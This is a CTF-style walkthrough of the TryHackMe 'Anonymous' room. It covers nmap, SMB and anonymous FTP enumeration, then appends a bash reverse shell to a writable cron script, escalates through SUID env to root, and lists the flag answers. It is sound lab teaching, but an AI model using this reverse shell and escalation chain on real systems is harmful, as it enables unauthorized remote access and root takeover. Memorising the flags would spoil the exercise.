
Link - "https://tryhackme.com/room/anonymous"

> Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.


-  Nmap Scan Result
```
tutu@G3-15:~/Downloads$ nmap -sCV -p- 10.10.159.20
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-07 00:59 BST
Nmap scan report for 10.10.159.20
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (conn-refused)

PORT    STATE SERVICE     VERSION

21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.128.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]

22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-05-07T00:00:47
|_  start_date: N/A
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-05-07T00:00:47+00:00

```

**Q1. Enumerate the machine.  How many ports are open?**
	4

**Q2. What service is running on port 21?**
	ftp

**Q3. What service is running on ports 139 and 445?**
	smb

We got the available shares using this simple command - 

```shell
$ smbclient -L //10.10.89.14 -U guest

Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```
Even with no password.

**Q4. There's a share on the user's computer.  What's it called?**
	pics

```shell

$ smbclient //10.10.89.14/pics -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 12:11:34 2020
  ..                                  D        0  Thu May 14 02:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 01:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 01:43:42 2020

		20508240 blocks of size 1024. 13306820 blocks available
smb: \> 

```
We got these images but nothing interesting here.

Well, we can also see that ftp anonymous login is allowed. Let's try that - 
	`ftp 10.10.159.20 21` user `anonymous`. 

We got an interesting directory `scripts` - 
```shell

ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35250|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1591 Sep 03 18:19 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```
Let's grab these files using  "get file_name" command and analyze these locally.

Clue - `clean.sh` has some interesting permission as we can see above.

```shell

$ cat clean.sh

#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

 First we deleted the "clean.sh" inside the ftp shell and modified it locally. We added a nc listener inside the `clean.sh` file and upload it again. 

> Well, somehow our script not getting any reverse shell. It can be for the executable permission we had before. But we can not make the modified file as executable. Do not know why?

So, We tried these steps. We left the "clean.sh" file as it is in the victim machine. We can append our code inside that "clean.sh" file for example - "/bin/bash -i >& /dev/tcp/10.8.135.159/9001 0>&1"  to get a reverse shell. So that the actual file will remain safe and also the executable permission.

Our "clean.sh" file - 
```
/bin/bash -i >& /dev/tcp/10.8.135.159/9001 0>&1
```

```shell

ftp> ls
229 Entering Extended Passive Mode (|||32759|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          903 Sep 03 19:07 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

ftp> append
(local-file) clean.sh
(remote-file) clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||21524|)
150 Ok to send data.
100% |**********************************************************************************************************************************************************************|    44      421.26 KiB/s    00:00 ETA
226 Transfer complete.
44 bytes sent in 00:00 (0.19 KiB/s)

ftp> more clean.sh

#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

bash -i >& /dev/tcp/10.8.135.159/4444 0>&1
ftp> 

```
And Finally we got the shell.

**Q1. user.txt**
	90d6f992585815ff991e68748c414740

Now, Lets try to find some interesting files - 

	'find / -perm -4000 -type f 2>/dev/null'

We can see - "/usr/bin/env" and also check the guide here for exploit this binary - 
	"https://gtfobins.github.io/gtfobins/env/#suid"

```shell

namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p
whoami
root
cd /root
ls
root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363

```
We got the root flag.

**Q2. root.txt**
	4d930091c31a622a7ed10f27999af363


! Happy Hacking !